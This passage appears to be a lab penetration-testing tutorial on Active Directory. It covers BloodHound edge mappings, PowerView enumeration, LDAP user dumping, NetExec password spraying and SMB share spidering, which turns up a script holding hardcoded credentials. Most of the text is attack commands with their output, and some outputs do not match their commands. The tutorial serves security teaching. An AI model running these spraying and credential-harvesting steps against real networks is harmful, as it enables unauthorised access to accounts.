    WriteSPN = 'WriteSPN',
    AddKeyCredentialLink = 'AddKeyCredentialLink',
    LocalToComputer = 'LocalToComputer',
    MemberOfLocalGroup = 'MemberOfLocalGroup',
    RemoteInteractiveLogonRight = 'RemoteInteractiveLogonRight',
    SyncLAPSPassword = 'SyncLAPSPassword',
    WriteAccountRestrictions = 'WriteAccountRestrictions',
    WriteGPLink = 'WriteGPLink',
    RootCAFor = 'RootCAFor',
    DCFor = 'DCFor',
    PublishedTo = 'PublishedTo',
    ManageCertificates = 'ManageCertificates',
    ManageCA = 'ManageCA',
    DelegatedEnrollmentAgent = 'DelegatedEnrollmentAgent',
    Enroll = 'Enroll',
    HostsCAService = 'HostsCAService',
    WritePKIEnrollmentFlag = 'WritePKIEnrollmentFlag',
    WritePKINameFlag = 'WritePKINameFlag',
    NTAuthStoreFor = 'NTAuthStoreFor',
    TrustedForNTAuth = 'TrustedForNTAuth',
    EnterpriseCAFor = 'EnterpriseCAFor',
    IssuedSignedBy = 'IssuedSignedBy',
    GoldenCert = 'GoldenCert',
    EnrollOnBehalfOf = 'EnrollOnBehalfOf',
    OIDGroupLink = 'OIDGroupLink',
    ExtendedByPolicy = 'ExtendedByPolicy',
    ADCSESC1 = 'ADCSESC1',
    ADCSESC3 = 'ADCSESC3',
    ADCSESC4 = 'ADCSESC4',
    ADCSESC6a = 'ADCSESC6a',
    ADCSESC6b = 'ADCSESC6b',
    ADCSESC9a = 'ADCSESC9a',
    ADCSESC9b = 'ADCSESC9b',
    ADCSESC10a = 'ADCSESC10a',
    ADCSESC10b = 'ADCSESC10b',
    ADCSESC13 = 'ADCSESC13',
    SyncedToEntraUser = 'SyncedToEntraUser',
    CoerceAndRelayNTLMToSMB = 'CoerceAndRelayNTLMToSMB',
    CoerceAndRelayNTLMToADCS = 'CoerceAndRelayNTLMToADCS',
    WriteOwnerLimitedRights = 'WriteOwnerLimitedRights',
    WriteOwnerRaw = 'WriteOwnerRaw',
    OwnsLimitedRights = 'OwnsLimitedRights',
    OwnsRaw = 'OwnsRaw',
    CoerceAndRelayNTLMToLDAP = 'CoerceAndRelayNTLMToLDAP',
    CoerceAndRelayNTLMToLDAPS = 'CoerceAndRelayNTLMToLDAPS',
    ContainsIdentity = 'ContainsIdentity',
    PropagatesACEsTo = 'PropagatesACEsTo',
    GPOAppliesTo = 'GPOAppliesTo',
    CanApplyGPO = 'CanApplyGPO',
    HasTrustKeys = 'HasTrustKeys',
}
```

We can also see how various collectors associate the access control entries (ACEs) with the relationships in the graph schema. For example, with the [`bloodhound.py`](https://github.com/dirkjanm/BloodHound.py/) collector, we can see how `Write` ACEs are mapped:

```python
writeprivs = ace_object.acedata.mask.has_priv(ACCESS_MASK.ADS_RIGHT_DS_WRITE_PROP)
if writeprivs:
    # GenericWrite
    if entrytype in ['user', 'group', 'computer', 'gpo', 'organizational-unit'] and not ace_object.acedata.has_flag(ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT):
        relations.append(build_relation(sid, 'GenericWrite', inherited=is_inherited))
    if entrytype == 'group' and can_write_property(ace_object, EXTRIGHTS_GUID_MAPPING['WriteMember']):
        relations.append(build_relation(sid, 'AddMember', '', inherited=is_inherited))
    if entrytype == 'computer' and can_write_property(ace_object, EXTRIGHTS_GUID_MAPPING['AllowedToAct']):
        relations.append(build_relation(sid, 'AddAllowedToAct', '', inherited=is_inherited))
    # Property set, but ignore Domain Admins since they already have enough privileges anyway
    if entrytype == 'computer' and can_write_property(ace_object, EXTRIGHTS_GUID_MAPPING['UserAccountRestrictionsSet']) and not sid.endswith('-512'):
        relations.append(build_relation(sid, 'WriteAccountRestrictions', '', inherited=is_inherited))
    if entrytype == 'organizational-unit' and can_write_property(ace_object, EXTRIGHTS_GUID_MAPPING['WriteGPLink']):
        relations.append(build_relation(sid, 'WriteGPLink', '', inherited=is_inherited))
```

For the explicit write privileges, we can see the `WriteSPN` relationship is mapped when the `Write` ACE is found on either a `user` or `computer` object on the `ServicePrincipalName` property.

```python
if entrytype in ['user', 'computer'] and ace_object.acedata.has_flag(ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT) \
and ace_object.acedata.get_object_type().lower() == objecttype_guid_map['service-principal-name']:
    relations.append(build_relation(sid, 'WriteSPN', inherited=is_inherited))
```

Another example is the common library used by [SharpHound]() for collecting and processing the access control entries (ACEs) which follow a very similar pattern. 

```csharp
// https://github.com/SpecterOps/SharpHoundCommon/tree/main/src/CommonLib/Processors/ACLProcessor.cs#L573
if (aceRights.HasFlag(ActiveDirectoryRights.GenericWrite) ||
    aceRights.HasFlag(ActiveDirectoryRights.WriteProperty) || 
    aceRights.HasFlag(ActiveDirectoryRights.GenericAll)) //GenericAll also works (see: https://github.com/SpecterOps/BloodHound/issues/613#issuecomment-2728437374)
{
    if (objectType is Label.User
        or Label.Group
        or Label.Computer
        or Label.GPO
        or Label.OU
        or Label.Domain
        or Label.CertTemplate
        or Label.RootCA
        or Label.EnterpriseCA
        or Label.AIACA
        or Label.NTAuthStore
        or Label.IssuancePolicy)
        if (aceType is ACEGuids.AllGuid or "")
            aces.Add(new ACE
            {
                PrincipalType = resolvedPrincipal.ObjectType,
                PrincipalSID = resolvedPrincipal.ObjectIdentifier,
                IsInherited = inherited,
                RightName = EdgeNames.GenericWrite,
                InheritanceHash = aceInheritanceHash
            });

    if (objectType == Label.User && aceType == ACEGuids.WriteSPN)
        aces.Add(new ACE
        {
            PrincipalType = resolvedPrincipal.ObjectType,
            PrincipalSID = resolvedPrincipal.ObjectIdentifier,
            IsInherited = inherited,
            RightName = EdgeNames.WriteSPN,
            InheritanceHash = aceInheritanceHash
        });
...
}
```

However as this is very much a "manual" process, it is inevitable that there are other writable attributes that are not mapped to a relationship in the graph schema that may be abusable under certain conditions such as the `scriptPath` or `UserPrincipalName`.

### PowerView

`PowerView` has long been the go-to tool for Active Directory enumeration and remains widely used today. It rose to prominence during a time when PowerShell-based tooling was extremely prevalent. Since then, many of these tools have been ported to standalone executables to reduce reliance on PowerShell. `PowerView` was eventually integrated into the [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) framework. However, the project has since been archived, with its last stable release being in 2015 (almost 10 years ago!).

The module is a self-contained file located in the `PowerSploit` repository, so we can simply fetch it with the following command:

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
```

This can be transferred onto any domain-joined Windows machine, and it should work out of the box after importing the module:

```powershell
PS C:\Users\async_testuser-001> import-module ./PowerView.ps1
PS C:\Users\async_testuser-001> Get-Domain

Forest                  : earth.local
DomainControllers       : {dc02.asia.earth.local}
Children                : {}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  : earth.local
PdcRoleOwner            : dc02.asia.earth.local
RidRoleOwner            : dc02.asia.earth.local
InfrastructureRoleOwner : dc02.asia.earth.local
Name                    : asia.earth.local
```

The `PowerView` module returns attributes that are accessible to the PowerShell `Select-Object` cmdlet, which is used to select specific properties from objects.

```powershell
PS C:\Users\async_testuser-001> Get-Domain | select Name,Parent,DomainMode

Name             Parent               DomainMode
----             ------               ----------
asia.earth.local earth.local Windows2012R2Domain

PS C:\Users\async_testuser-001> Get-Domain | select Name,Parent,DomainMode | Format-List


Name       : asia.earth.local
Parent     : earth.local
DomainMode : Windows2012R2Domain
```

#### Computers

We can list all domain computers using the `Get-DomainComputer` cmdlet:

```powershell
PS C:\Users\async_testuser-001> Get-DomainComputer | select name, dnshostname, operatingsystem | Format-List

name            : DC02
dnshostname     : dc02.asia.earth.local
operatingsystem : Windows Server 2022 Standard Evaluation

name            : WEB01
dnshostname     : web01.asia.earth.local
operatingsystem : Windows Server 2022 Standard Evaluation

name            : DEV-PC001
dnshostname     : dev-pc001.asia.earth.local
operatingsystem : Windows Server 2022 Standard Evaluation

name            : DEV-PC002
dnshostname     : dev-pc002.asia.earth.local
operatingsystem : Windows Server 2022 Standard Evaluation

name            : DEV-PC003
dnshostname     : dev-pc003.asia.earth.local
operatingsystem : Windows Server 2022 Standard Evaluation

name            : FS01
dnshostname     : fs01.asia.earth.local
operatingsystem : Windows Server 2022 Standard Evaluation

name            : SQL01
dnshostname     : sql01.asia.earth.local
operatingsystem : Windows Server 2022 Standard Evaluation

name            : PT01
dnshostname     : pt01.asia.earth.local
operatingsystem : Windows Server 2022 Standard Evaluation

name            : STAGING01
dnshostname     : staging01.asia.earth.local
operatingsystem : pc-linux-gnu
```

We can also pipe this into `Resolve-DnsName` to resolve the IP addresses of each computer:

```powershell
PS C:\Users\async_testuser-001> Get-DomainComputer | select dnshostname | % { if($_.dnshostname) { "$(try{(Resolve-DnsName $_.dnshostname -Type A).IPAddress}catch{'FAILED'}) $($_.dnshostname)" } }

10.5.10.20 dc02.asia.earth.local
10.5.10.30 web01.asia.earth.local
10.5.10.40 dev-pc001.asia.earth.local
10.5.10.41 dev-pc002.asia.earth.local
10.5.10.42 dev-pc003.asia.earth.local
10.5.10.50 fs01.asia.earth.local
10.5.10.60 sql01.asia.earth.local
10.5.10.70 pt01.asia.earth.local
10.5.20.74 staging01.asia.earth.local
```

#### Users

We can list all domain users using the `Get-DomainUser` cmdlet, and specifically get information on our current user by using the `-Identity` parameter

```
PS C:\Users\async_testuser-001> Get-DomainUser -Identity "async_testuser-001"


logoncount            : 48
badpasswordtime       : 1/1/1601 8:00:00 AM
distinguishedname     : CN=async_testuser-001,CN=Users,DC=asia,DC=earth,DC=local
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 6/19/2025 8:28:13 AM
name                  : async_testuser-001
objectsid             : S-1-5-21-114237654-1594001096-2651204834-1618
samaccountname        : async_testuser-001
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 6/19/2025 12:28:13 AM
instancetype          : 4
usncreated            : 24650
objectguid            : 958585a4-de51-4c86-9048-e2a79e7458a5
lastlogoff            : 1/1/1601 8:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=earth,DC=local
dscorepropagationdata : {6/24/2025 2:28:19 AM, 6/24/2025 2:22:37 AM, 6/24/2025 2:20:38 AM, 6/24/2025 2:17:49 AM...}
memberof              : CN=T1 Infrastructure Admins (old),CN=Users,DC=asia,DC=earth,DC=local
lastlogon             : 6/24/2025 11:32:25 AM
badpwdcount           : 0
cn                    : async_testuser-001
useraccountcontrol    : NORMAL_ACCOUNT
whencreated           : 6/19/2025 12:14:22 AM
primarygroupid        : 513
pwdlastset            : 6/19/2025 8:14:22 AM
usnchanged            : 26998
```

Similarly, there are some useful commandlets for enumerating users that are asreproastable and those that have a `ServicePrincipalName` (SPN) set:

```powershell
PS C:\Users\async_testuser-001> Get-DomainUser -PreauthNotRequired | select name

name      
----
Lily MOORE
```

```powershell
PS C:\Users\async_testuser-001> Get-DomainUser -SPN | select name, serviceprincipalname

name    serviceprincipalname                                                   
----    --------------------
krbtgt  kadmin/changepw
svc_sql {MSSQLSvc/SQL01.asia.earth.local:1433, MSSQLSvc/SQL01.asia.earth.local}
```

We can also find users that are administrators (`adminCount=1`) in the domain, which are typically members of privileged groups:

```powershell
PS C:\Users\async_testuser-001> Get-DomainUser -AdminCount | select name

name         
----         
Administrator
krbtgt       
async_adm    
T0-H.WANG    
T0-J.ZHANG   
T0-L.CHEN    
T0-Y.LIU     
T0-M.HUANG   
T0-Z.LEE  
```

#### Groups

Similarly, we can get a list of all groups in the domain using the `Get-DomainGroup` cmdlet:

```powershell
PS C:\Users\async_testuser-001> Get-DomainGroup | select name

[..snip..]
T1 Access Accounts
T2 APAC Leads
T1 Web Developers
T1 Infrastructure Administrators
T2 Database Administrators
Engineering
Data Analytics
Security Operations
Product Development
Network Engineers
Security Analysts
App Developers
Cloud Infrastructure
Data Operations
System Architects
DevOps Engineers
Compliance Team                        
Platform Services
Quality Assurance
Business Intel
Technical Writers
Titan Research
Europa Labs
Ganymede Systems
Phobos Security
Deimos Control
Ceres Mining
Vesta Operations
Enceladus Research
Callisto Command
Triton Networks
Linux Administrators
T0 Fileshare Administrators
migrated devs
Tier-0 Global Administrators
T1 Infrastructure Admins (old)
```

We can also check for nested group membership, for example groups that are nested within the `Domain Admins` group:

```powershell
PS C:\Users\async_testuser-001> Get-DomainGroupMember "Domain Admins" | Where-Object {$_.MemberObjectClass -eq "group"} | select MemberDistinguishedName, MemberName

MemberDistinguishedName                                            MemberName      
-----------------------                                            ----------
CN=Tier-0 Global Administrators,CN=Users,DC=asia,DC=earth,DC=local T0-Global-Admins
```

## Network Mapping

@ TODO

...
...


## Password Spraying (Internal)

One of the quickest paths to initial access in an internal Active Directory environment is password spraying. It's not uncommon to find users with weak credentials sometimes as simple as having their username set as the password. This is often all it takes to compromise an entire domain.

Before spraying, we’ll first extract a list of valid usernames using LDAP:

```
ldapsearch -x -H ldap://dc02.asia.earth.local -D "ASIA\Lily_MOORE" -w "austin1" -b "DC=asia,DC=earth,DC=local" "(objectClass=user)" sAMAccountName | grep "^sAMAccountName" | cut -d' ' -f2- > users.txt
```


While internal spraying is effective, it comes with potential downsides. Repeated failed login attempts may trigger account lockouts depending on the password policy, which can raise alarms during an engagement. It's important to balance effectiveness with stealth and to ensure that spraying is performed carefully and with awareness of lockout thresholds.

When testing authentication, the domain controller will first check whether the account is locked out based on the current password policy. If the account is not locked, it will then verify the password’s validity. If the password is correct, the user will be authenticated and the `badPwdCount` attribute in LDAP will be reset to `0`. However, if the password is incorrect, `badPwdCount` will be incremented. If this count exceeds the defined threshold in the password policy, the account will be locked. In that case, the `lockoutTime` attribute will be updated with the current timestamp to reflect the lockout status.


```
nxc smb DC02.asia.earth.local -u 'Lily_MOORE' -p 'austin1' --pass-pol

SMB         10.5.10.20      445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:asia.earth.local) (signing:True) (SMBv1:False) 
SMB         10.5.10.20      445    DC02             [+] asia.earth.local\Lily_MOORE:austin1 
SMB         10.5.10.20      445    DC02             [+] Dumping password info for domain: ASIA
SMB         10.5.10.20      445    DC02             Minimum password length: 7
SMB         10.5.10.20      445    DC02             Password history length: None
SMB         10.5.10.20      445    DC02             Maximum password age: Not Set
SMB         10.5.10.20      445    DC02             
SMB         10.5.10.20      445    DC02             Password Complexity Flags: 000000
SMB         10.5.10.20      445    DC02                 Domain Refuse Password Change: 0
SMB         10.5.10.20      445    DC02                 Domain Password Store Cleartext: 0
SMB         10.5.10.20      445    DC02                 Domain Password Lockout Admins: 0
SMB         10.5.10.20      445    DC02                 Domain Password No Clear Change: 0
SMB         10.5.10.20      445    DC02                 Domain Password No Anon Change: 0
SMB         10.5.10.20      445    DC02                 Domain Password Complex: 0
SMB         10.5.10.20      445    DC02             
SMB         10.5.10.20      445    DC02             Minimum password age: None
SMB         10.5.10.20      445    DC02             Reset Account Lockout Counter: 30 minutes 
SMB         10.5.10.20      445    DC02             Locked Account Duration: 30 minutes 
SMB         10.5.10.20      445    DC02             Account Lockout Threshold: None
SMB         10.5.10.20      445    DC02             Forced Log off Time: Not Set
```


The `--no-brute` flag tells NetExec to try only matching username-password pairs from files instead of all combinations, avoiding brute-force spraying, while the `--continue-on-success` is self explanatory.

```
nxc smb dc02.asia.earth.local -u users.txt -p users.txt --no-brute --continue-on-success

SMB         10.5.10.20      445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:asia.earth.local) (signing:True) (SMBv1:False) 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\Sandra.ANDERSON:Sandra.ANDERSON STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\Richard.JONES:Richard.JONES STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T2-B.PEREZ:T2-B.PEREZ STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\David.THOMAS:David.THOMAS STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T2-L.RODRIGUEZ:T2-L.RODRIGUEZ STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T2-N.THOMPSON:T2-N.THOMPSON STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\Chris.JACKSON:Chris.JACKSON STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\Helen.MILLER:Helen.MILLER STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T1-W.ROBINSON:T1-W.ROBINSON STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\Mary.DAVIS:Mary.DAVIS STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [+] asia.earth.local\Sophie_BENNETT:Sophie_BENNETT 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\Sarah.LOPEZ:Sarah.LOPEZ STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T2-R.TAYLOR:T2-R.TAYLOR STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T2-P.JOHNSON:T2-P.JOHNSON STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\John.JONES:John.JONES STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T2-D.LEWIS:T2-D.LEWIS STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T1-S.ANDERSON:T1-S.ANDERSON STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\William.JOHNSON:William.JOHNSON STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T2-E.DAVIS:T2-E.DAVIS STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T1-T.CLARK:T1-T.CLARK STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\Robert.MOORE:Robert.MOORE STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T2-E.TAYLOR:T2-E.TAYLOR STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T1-M.JACKSON:T1-M.JACKSON STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T1-K.SMITH:T1-K.SMITH STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\Anthony.DAVIS:Anthony.DAVIS STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T2-M.GARCIA:T2-M.GARCIA STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T1-A.WILLIAMS:T1-A.WILLIAMS STATUS_LOGON_FAILURE 
SMB         10.5.10.20      445    DC02             [-] asia.earth.local\T2-R.JOHNSON:T2-R.JOHNSON STATUS_LOGON_FAILURE 
```


As we can see we have authentication as a user here.

## SMB Share Enumeration


SMB (Server Message Block) is a protocol that lets computers share files, folders, and printers over a network. When you hear "SMB share" it just means a folder or resource on one computer that is made available to others on the network using the SMB protocol. So for example, a company might have a shared folder called `\\FILESERVER\Projects` that employees can access using their own computers. That's an SMB share.

SMB Share enumeration is **very** important as it could assist you in making progress without the need of exploiting any vulnerabilities, exposed credentials are the easiest and best way to move laterally.


**Manual Enumeration**

For this section Impacket's  `smbclient.py` will be used to enumerate the shares and their contents

```
smbclient.py 'asia.earth.local'/'Lily_MOORE':'austin1'@10.5.10.20

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
Type help for list of commands

# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL

# use SYSVOL

# ls
drw-rw-rw-          0  Wed Jun 18 18:46:43 2025 .
drw-rw-rw-          0  Wed Jun 18 18:46:43 2025 ..
drw-rw-rw-          0  Wed Jun 18 18:46:43 2025 asia.earth.local

# cd asia.earth.local

# ls
drw-rw-rw-          0  Thu Jun 19 04:29:31 2025 .
drw-rw-rw-          0  Wed Jun 18 18:46:43 2025 ..
drw-rw-rw-          0  Wed Jun 18 19:58:48 2025 DfsrPrivate
drw-rw-rw-          0  Wed Jun 18 18:46:43 2025 Policies
drw-rw-rw-          0  Wed Jun 18 20:01:41 2025 scripts
drw-rw-rw-          0  Thu Jun 19 04:29:31 2025 StarterGPOs

# cd scripts

# ls
drw-rw-rw-          0  Wed Jun 18 20:01:41 2025 .
drw-rw-rw-          0  Thu Jun 19 04:29:31 2025 ..
-rw-rw-rw-       5853  Wed Jun 18 20:01:44 2025 share_test.ps1



# cat share_test.ps1
param(
    [string]$Username = "T1-J.BARTOLEMO",
    [string]$Password = "Jp@ssW0rd!@",
    [string]$ShareName = "internal-temp",
    [string]$LogFile = "ShareAccessTest_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"
)
Import-Module ActiveDirectory -ErrorAction SilentlyContinue

[...SNIP...]

if ($SuccessfulAccess.Count -gt 0) {
    Write-Host "`nSUCCESSFUL CONNECTIONS:" -ForegroundColor Green
    $SuccessfulAccess | Select-Object ComputerName, Domain, SharePath | Format-Table -AutoSize
}


# get share_test.ps1
```



**Automated Enumeration**

One tool that assists in SMB enumeration is NXC's `spider_plus` module, it allows you to list and dump all files from all readable shares

```
nxc smb DC02.asia.earth.local -u Lily_MOORE -p Lily_MOORE --shares -M spider_plus

SMB         10.5.10.20      445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:asia.earth.local) (signing:True) (SMBv1:False) 
SMB         10.5.10.20      445    DC02             [+] asia.earth.local\Nathan_CARTER:Nathan_CARTER 
SPIDER_PLUS 10.5.10.20      445    DC02             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.5.10.20      445    DC02             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.5.10.20      445    DC02             [*]     STATS_FLAG: True
SPIDER_PLUS 10.5.10.20      445    DC02             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.5.10.20      445    DC02             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.5.10.20      445    DC02             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.5.10.20      445    DC02             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.5.10.20      445    DC02             [*] Enumerated shares
SMB         10.5.10.20      445    DC02             Share           Permissions     Remark
SMB         10.5.10.20      445    DC02             -----           -----------     ------
SMB         10.5.10.20      445    DC02             ADMIN$                          Remote Admin
SMB         10.5.10.20      445    DC02             C$                              Default share
SMB         10.5.10.20      445    DC02             IPC$            READ            Remote IPC
SMB         10.5.10.20      445    DC02             NETLOGON        READ            Logon server share 
SMB         10.5.10.20      445    DC02             SYSVOL          READ            Logon server share 
SPIDER_PLUS 10.5.10.20      445    DC02             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.5.10.20.json".
SPIDER_PLUS 10.5.10.20      445    DC02             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.5.10.20      445    DC02             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.5.10.20      445    DC02             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.5.10.20      445    DC02             [*] Total folders found:  23
SPIDER_PLUS 10.5.10.20      445    DC02             [*] Total files found:    13
SPIDER_PLUS 10.5.10.20      445    DC02             [*] File size average:    2.05 KB
SPIDER_PLUS 10.5.10.20      445    DC02             [*] File size min:        22 B
SPIDER_PLUS 10.5.10.20      445    DC02             [*] File size max:        5.72 KB

```

now to see what's actually in those shares we need to read the following file `/home/kali/.nxc/modules/nxc_spider_plus/10.5.10.20.json`

![[Authenticated access-20250624010028036.webp|941]]

```
cat /home/kali/.nxc/modules/nxc_spider_plus/10.5.10.20.json                                                                                                                      

06:56:35 [33/127]
{                                                                                                         
    "NETLOGON": {                                                                                                                                                                                                   
        "share_test.ps1": {                                                                               
            "atime_epoch": "2025-06-18 20:01:41",                                                         
            "ctime_epoch": "2025-06-18 20:01:41",                                                         
            "mtime_epoch": "2025-06-18 20:01:44",                                                         
            "size": "5.72 KB"                                                                             
        }                                                                                                 
    },                                                                                                                                                                                                              
    "SYSVOL": {                                                                                                                                                                                                     
        "asia.earth.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {                                                                                                                               
            "atime_epoch": "2025-06-19 04:26:39",                                                                                                                                                                   
            "ctime_epoch": "2025-06-18 18:46:37",                                                                                                                                                                   
            "mtime_epoch": "2025-06-19 04:28:33",                                                         
            "size": "22 B"                                                                                
        },                                                                                                
        "asia.earth.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {                                                                                      
            "atime_epoch": "2025-06-18 19:50:52",                                                         
            "ctime_epoch": "2025-06-18 18:46:37",                                                         
            "mtime_epoch": "2025-06-19 04:28:33",                                                         
            "size": "1.07 KB"                                                                             
        },                                                                                                                                                                                                          
[...snip...]                                                                                                                                                                                                         
        "asia.earth.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2025-06-18 18:46:37",
            "ctime_epoch": "2025-06-18 18:46:37",
            "mtime_epoch": "2025-06-18 18:46:43",
            "size": "3.68 KB"
        },
        "asia.earth.local/StarterGPOs/{0CC42745-34A0-4C7E-ACFA-37CE56B13706}/Machine/Registry.pol": {
            "atime_epoch": "2025-06-19 04:29:31",
            "ctime_epoch": "2025-06-19 04:29:31",
            "mtime_epoch": "2025-06-19 04:29:31",
            "size": "2.49 KB"
        },
        "asia.earth.local/StarterGPOs/{0CC42745-34A0-4C7E-ACFA-37CE56B13706}/StarterGPO.tmplx": {
            "atime_epoch": "2025-06-19 04:29:31",
            "ctime_epoch": "2025-06-19 04:29:31",
            "mtime_epoch": "2025-06-19 04:29:31",
            "size": "794 B"

```

Now once we logon we notice something quite interesting which is the `share_test.ps1` file


Access to this specific file comes down to how SMB permissions are configured certain groups are assigned exclusive shares that only their members can access. In this case, the share appears to be broadly accessible, meaning the user `Lily_MOORE` doesn’t need to belong to any privileged group to view its contents.

lets download the files using the same module

```
nxc smb DC02.asia.earth.local -u Lily_MOORE -p Lily_MOORE -M spider_plus -o DOWNLOAD_FLAG=TRUE

SMB         10.5.10.20      445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:asia.earth.local) (signing:True) (SMBv1:False) 
SMB         10.5.10.20      445    DC02             [+] asia.earth.local\Nathan_CARTER:Nathan_CARTER 
SPIDER_PLUS 10.5.10.20      445    DC02             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.5.10.20      445    DC02             [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 10.5.10.20      445    DC02             [*]     STATS_FLAG: True
SPIDER_PLUS 10.5.10.20      445    DC02             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.5.10.20      445    DC02             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.5.10.20      445    DC02             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.5.10.20      445    DC02             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.5.10.20      445    DC02             [*] Enumerated shares
SMB         10.5.10.20      445    DC02             Share           Permissions     Remark
SMB         10.5.10.20      445    DC02             -----           -----------     ------
SMB         10.5.10.20      445    DC02             ADMIN$                          Remote Admin
SMB         10.5.10.20      445    DC02             C$                              Default share
SMB         10.5.10.20      445    DC02             IPC$            READ            Remote IPC
SMB         10.5.10.20      445    DC02             NETLOGON        READ            Logon server share 
SMB         10.5.10.20      445    DC02             SYSVOL          READ            Logon server share 
SPIDER_PLUS 10.5.10.20      445    DC02             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.5.10.20.json".
SPIDER_PLUS 10.5.10.20      445    DC02             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.5.10.20      445    DC02             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.5.10.20      445    DC02             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.5.10.20      445    DC02             [*] Total folders found:  23
SPIDER_PLUS 10.5.10.20      445    DC02             [*] Total files found:    13
SPIDER_PLUS 10.5.10.20      445    DC02             [*] File size average:    2.05 KB
SPIDER_PLUS 10.5.10.20      445    DC02             [*] File size min:        22 B
SPIDER_PLUS 10.5.10.20      445    DC02             [*] File size max:        5.72 KB
SPIDER_PLUS 10.5.10.20      445    DC02             [*] File unique exts:     6 (ps1, inf, tmpll, pol, ini, tmplx)
SPIDER_PLUS 10.5.10.20      445    DC02             [*] Unmodified files:     13
SPIDER_PLUS 10.5.10.20      445    DC02             [*] All files were not changed.
SPIDER_PLUS 10.5.10.20      445    DC02             [+] All files processed successfully.

```


While reviewing the contents of `share_test.ps1`, we find hardcoded credentials for the user `T1-J.BARTOLEMO`:

```
cat share_test.ps1                                    

param(                                                                                                                                                                                                              
    [string]$Username = "T1-J.BARTOLEMO",                                                                 
    [string]$Password = "Jp@ssW0rd!@",                                                                                                                                                                              
    [string]$ShareName = "internal-temp",                                                                 
